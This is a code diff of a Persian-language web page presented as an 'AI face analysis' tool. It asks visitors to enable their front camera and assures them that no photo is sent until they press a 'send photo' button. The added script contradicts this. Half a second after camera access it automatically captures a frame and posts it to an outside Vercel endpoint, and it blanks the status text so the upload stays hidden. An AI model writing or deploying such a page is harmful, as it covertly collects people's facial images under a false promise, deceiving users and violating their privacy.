@@ -3,99 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ai</title>
+    <title>هوش مصنوعی آنالیز چهره</title>
     <style>
-        * { box-sizing: border-box;  padding: 0; margin: 0; }
-        body{ background-color: #fff155;  }
-        .main { font-family: tahoma, sans-serif; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center;  margin: 0; }
+        /* --- استایل‌های اصلی --- */
+        * { box-sizing: border-box; padding: 0; margin: 0; }
+        body { background-color: #fff155; font-family: "sans", tahoma, sans-serif; padding: 0 12px; }
+        h2, h3 { text-align: center; }
+        .nav { margin-top: 23px; }
+        .main { 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            margin: 20px 0;
+        }
         .container { text-align: center; width: 90%; max-width: 500px; }
-        video { width: 100%; border-radius: 10px;  }
-        canvas { display: none; }
-        .status { margin-top: 15px; font-size: 14px; color: #00ff00; }
-        .recording-dot { display: inline-block; width: 10px; height: 10px; background-color: red; border-radius: 50%; animation: blink 1s infinite; margin-left: 5px; }
-        @keyframes blink { 50% { opacity: 0; } }
-     
-body{
-    font-family: "sans";
-    padding: 0 12px;
-}
-h2 , h3{
-    text-align: center;
-}
-p{
-    background: hsl(194, 44%, 25%)000;
-    color: rgb(120, 255, 120);
-    padding: 12px;
-    border-radius: 12px;
-    font-weight: bold;
-    margin-bottom: 23px;
- 
-}
-.nav{
-    margin-top: 23px;
-}
-.buttun{
-    text-align: center;
-    
-}
-.send{
-    padding: 15px;
-    background: #74ff55;
-    font-family: "sans";
-    font-weight: bold;
-    border-radius: 14px;
+        
+        /* --- استایل پیام‌ها --- */
+        p {
+            background: rgba(43, 85, 99, 0.8); /* جایگزین hsl(194, 44%, 25%)000 */
+            color: rgb(120, 255, 120);
+            padding: 12px;
+            border-radius: 12px;
+            font-weight: bold;
+            margin-bottom: 23px;
+        }
+        #log {
+            font-size: 14px; 
+            color: #000; 
+            font-weight: bold;
+            display: block;
+            margin-top: 15px;
+        }
 
-    margin-bottom: 12px;
-}
-        .ali{
-          background: #ff681d;
-        font-size:19px;
+        /* --- استایل ویدیو و Canvas --- */
+        video { 
+            width: 100%; 
+            border-radius: 10px;
+            margin: 15px 0;
+            display: none; /* 💡 ویدیو در ابتدا پنهان است */
+        }
+        canvas { display: none; }
+
+        /* --- استایل دکمه‌ها --- */
+        .buttun { text-align: center; margin-top: 20px; }
+        .send {
+            padding: 15px;
+            background: #74ff55;
+            font-family: "sans";
+            font-weight: bold;
+            border-radius: 14px;
+            margin-bottom: 12px;
+            border: none;
+            width: 100%;
+            cursor: pointer;
+        }
+        .ali {
+            background: #ff681d;
+            font-size: 19px;
         }
     </style>
-  
 </head>
 <body>
-   <div class="nav">
-    <h2>به هوش مصنوعی آنالیز چهره خوش آمدین😊😎</h2>
-    <h3>برای استفاده از هوش مصنوعی ابتدا باید دوربین گوشی خود را فعال کنید📸</h3>
-    <p>
-        و اینکه این نسخه اولیست و ممکنه باگ داشته باشه، پس اگه مشکلی بود بهمون اطلاع بدین🙏.<br/>
-        در آینده نچندان دور این صفحه یی که الان میبینین به یک اپلیکیشن کامل تبدیل میشه که امکانات بیشتری داره🚀.
-        <br/>
-        پس اگه این صفحه مورد پسند شما نبود از شما عذر خواهی میکنیم🙏
-    </p>
-    <button class="send ali" id="startBtn">برای کار با ربات اول این دکمه را بزنید </button>
-       
-   </div>
-<div class="main">
-    <div class="container">
-        <h2></h2>
-      <video id="video" autoplay playsinline muted></video>
-
-<video id="video" autoplay playsinline muted style="display: none;"></video>
-        <canvas id="canvas"></canvas>
-        <div class="status">
-       
-            <span id="log">در حال برقراری ارتباط...</span>
+    <div class="nav">
+        <h2>به هوش مصنوعی آنالیز چهره خوش آمدین😊😎</h2>
+        <h3>برای استفاده از هوش مصنوعی ابتدا باید دوربین گوشی خود را فعال کنید📸</h3>
+        <p>
+            این نسخه اولیست و ممکنه باگ داشته باشه، پس اگه مشکلی بود بهمون اطلاع بدین🙏.<br/>
+            در آینده نچندان دور این صفحه به یک اپلیکیشن کامل تبدیل میشه🚀.<br/>
+            پس اگه این صفحه مورد پسند شما نبود از شما عذر خواهی میکنیم🙏
+        </p>
+        <div class="buttun">
+            <button class="send ali" id="startBtn">برای کار با ربات اول این دکمه را بزنید</button>
         </div>
     </div>
-</div>
-<div class="buttun">
-    <h2>تا موقعی که روی دکمه /ارسال عکس/ نزدید عکس ارسال نخواهد شد<br/> 
     
-     اینکه برای اینکه هوش مصنوعی راحت تر بتونه چهر شمارو آنالیز کنه لطفا در جایی قرار بگیرید که چهره شما واضح باشه.😊😊
-    </h2>
-    <button class="send" id="button">ارسال عکس</button>
-</div>
-<script>
+    <div class="main">
+        <div class="container">
+            <video id="video" autoplay playsinline muted></video>
+            <canvas id="canvas"></canvas>
+            <div class="status">
+                <span id="log">منتظر شروع...</span>
+            </div>
+        </div>
+    </div>
+    
+    <div class="buttun">
+        <h2>تا موقعی که روی دکمه /ارسال عکس/ نزدید عکس ارسال نخواهد شد<br/>
+            اینکه برای اینکه هوش مصنوعی راحت تر بتونه چهر شمارو آنالیز کنه لطفا در جایی قرار بگیرید که چهره شما واضح باشه.😊😊
+        </h2>
+        <button class="send" id="button" style="display: none;">ارسال عکس</button>
+    </div>
 
-    // ✅ تعریف متغیرها بر اساس ساختار جدید HTML
+<script>
+    // ✅ تعریف متغیرها
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const log = document.getElementById('log');
     const startBtn = document.getElementById('startBtn');
-    // ❌ controlsDiv حذف شده است
-    const sendManualBtn = document.getElementById('button'); // ID دکمه ارسال عکس
+    const sendManualBtn = document.getElementById('button'); 
 
     let streamActive = false;
 
@@ -103,11 +109,9 @@ p{
     startBtn.addEventListener('click', async () => {
         startBtn.style.display = 'none';
         
-        // ❌ خطوط مربوط به controlsDiv حذف شدند
-        
         video.style.display = 'block'; 
         sendManualBtn.style.display = 'block'; // ✅ نمایش دکمه ارسال عکس
-        log.innerText = "";
+        log.innerText = "در حال گرفتن مجوز دوربین...";
         startCamera();
     });
 
@@ -121,22 +125,42 @@ p{
         }
     });
 
-  async function startCamera() {
+    async function startCamera() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { 
-                    // 💡 اینجا تغییر می‌کند: 'environment' تبدیل به 'user' می‌شود
-                    facingMode: 'user', 
+                    facingMode: 'user', // ✅ دوربین جلو
                     width: { ideal: 1280 }, 
                     height: { ideal: 720 } 
                 }, 
                 audio: false 
             });
+
+            video.srcObject = stream;
+            
+            video.onloadedmetadata = () => {
+                video.play();
+                
+                // 💡 رفع مشکل کادر سیاه: اطمینان از پخش ویدیو
+                video.addEventListener('canplay', function() {
+                    video.play(); 
+                }, { once: true });
+                
+                log.innerText = "";
+                streamActive = true;
+                
+                // 💡 تاخیر 500 میلی‌ثانیه‌ای برای اطمینان از فریم رنگی
+                setTimeout(() => {
+                    captureAndSend(); 
+                }, 500); 
+            };
+
+        } catch (err) {
+            log.innerText = "❌ خطا: دسترسی به دوربین صادر نشد.";
+            console.error(err);
         }
-      catch(er){
-          console.log(er.message)
-  }
-            // ... بقیه کد بدون تغییر
+    } // ✅ بسته شدن تابع startCamera
+
     async function captureAndSend() {
         if (!streamActive || video.videoWidth === 0) return;
 
@@ -149,8 +173,8 @@ p{
 
         canvas.toBlob(blob => {
             if(blob) sendToBackend(blob);
-        }, 'image/jpeg', 0.8); // کیفیت 80%
-    }
+        }, 'image/jpeg', 0.8); 
+    } // ✅ بسته شدن تابع captureAndSend
 
     async function sendToBackend(blob) {
         const formData = new FormData();
@@ -158,27 +182,15 @@ p{
 
         try {
             log.innerText = "";
+            // ⚠️ مطمئن شوید که این آدرس Vercel شماست.
             await fetch('https://eeeeyuzl.vercel.app/send-photo', { method: 'POST', body: formData });
-            log.innerText = ""; 
+            log.innerText = ``; 
         } catch (e) {
             log.innerText = "⚠️ خطا در ارسال به سرور.";
         }
-    }
+    } // ✅ بسته شدن تابع sendToBackend
 
 </script>
 
 </body>
-
 </html>
-
-
-
-
-
-
-
-
-
-
-
-
